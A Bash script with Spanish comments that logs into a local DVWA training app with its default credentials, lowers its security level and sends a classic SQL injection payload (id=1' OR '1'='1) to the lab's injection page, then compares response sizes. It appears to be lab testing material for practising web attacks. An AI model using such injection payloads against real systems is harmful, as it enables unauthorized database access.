#!/bin/bash
#
# test-simple-sqli.sh - Test simple con sesión válida
#

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/utils.sh"

TARGET_URL="http://localhost"
COOKIE_FILE="/tmp/dvwa_test_cookies.txt"

echo "🔍 TEST SIMPLE SQL INJECTION"
echo "=============================="
echo ""

# Paso 1: Obtener token y login
echo "[1] Login con CSRF token..."
login_page=$(curl -s -c "$COOKIE_FILE" "$TARGET_URL/login.php")
user_token=$(echo "$login_page" | grep -oP "user_token' value='\K[^']+")

curl -s -L -b "$COOKIE_FILE" -c "$COOKIE_FILE" \
    -d "username=admin&password=password&Login=Login&user_token=$user_token" \
    "$TARGET_URL/login.php" > /dev/null

PHPSESSID=$(grep PHPSESSID "$COOKIE_FILE" | awk '{print $7}')
echo "    Sesión: $PHPSESSID"
echo ""

# Paso 2: Configurar seguridad
echo "[2] Configurar security=low..."
security_page=$(curl -s -L -b "$COOKIE_FILE" "$TARGET_URL/security.php")
security_token=$(echo "$security_page" | grep -oP "user_token' value='\K[^']+")

curl -s -L -b "$COOKIE_FILE" -c "$COOKIE_FILE" \
    -d "security=low&seclev_submit=Submit&user_token=$security_token" \
    "$TARGET_URL/security.php" > /dev/null
echo "    ✓ Configurado"
echo ""

# Paso 3: Test sin inyección (id=1)
echo "[3] Test normal: id=1"
echo "    URL: $TARGET_URL/vulnerabilities/sqli/?id=1&Submit=Submit"
normal=$(curl -s -L -b "$COOKIE_FILE" "$TARGET_URL/vulnerabilities/sqli/?id=1&Submit=Submit")

echo ""
echo "--- HTML Completo (primeras 200 líneas) ---"
echo "$normal" | head -200
echo ""

echo "--- Buscar 'First name' ---"
echo "$normal" | grep -i "First name"
echo ""

echo "--- Buscar 'ID:' ---"
echo "$normal" | grep -i "ID:"
echo ""

echo "--- Buscar tabla <table> ---"
echo "$normal" | grep -i "<table"
echo ""

# Guardar para inspección
echo "$normal" > /tmp/test_normal_response.html
echo "Guardado en: /tmp/test_normal_response.html"
echo ""

# Paso 4: Test CON inyección básica
echo "[4] Test SQLi: id=1' OR '1'='1"
echo "    URL (sin encoding): $TARGET_URL/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit"
sqli=$(curl -s -L -b "$COOKIE_FILE" "$TARGET_URL/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271&Submit=Submit")

echo ""
echo "--- HTML Completo (primeras 200 líneas) ---"
echo "$sqli" | head -200
echo ""

# Guardar
echo "$sqli" > /tmp/test_sqli_response.html
echo "Guardado en: /tmp/test_sqli_response.html"
echo ""

# Comparar tamaños
normal_size=$(echo "$normal" | wc -c)
sqli_size=$(echo "$sqli" | wc -c)

echo "[5] Comparación:"
echo "    Normal: $normal_size bytes"
echo "    SQLi:   $sqli_size bytes"
echo ""

if [ "$sqli_size" -gt "$normal_size" ]; then
    echo "    ✓ SQLi tiene más contenido (probablemente funciona)"
else
    echo "    ✗ Tamaños similares (posible problema)"
fi
echo ""

echo "=============================="
echo "✓ Test completado"
echo ""
echo "Revisa los archivos:"
echo "  cat /tmp/test_normal_response.html"
echo "  cat /tmp/test_sqli_response.html"
